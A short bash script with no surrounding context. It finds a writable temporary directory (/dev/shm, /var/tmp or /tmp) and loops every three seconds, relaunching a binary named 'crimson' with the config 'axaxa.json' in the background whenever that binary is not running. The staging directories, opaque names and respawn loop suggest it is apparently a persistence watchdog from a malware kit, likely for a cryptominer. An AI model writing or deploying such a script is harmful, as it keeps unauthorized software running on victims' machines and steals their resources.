#!/bin/bash

if [ -w "/dev/shm" ]; then
    DIR1="/dev/shm"
elif [ -w "/var/tmp" ]; then
    DIR1="/var/tmp"
elif [ -w "/tmp" ]; then
    DIR1="/tmp"
else
    exit 0
fi

while true; do
    if ! pgrep -f "crimson" > /dev/null; then
        cd "$DIR1" && exec ./crimson -c "$DIR1/axaxa.json --background"
    fi
    sleep 3
done
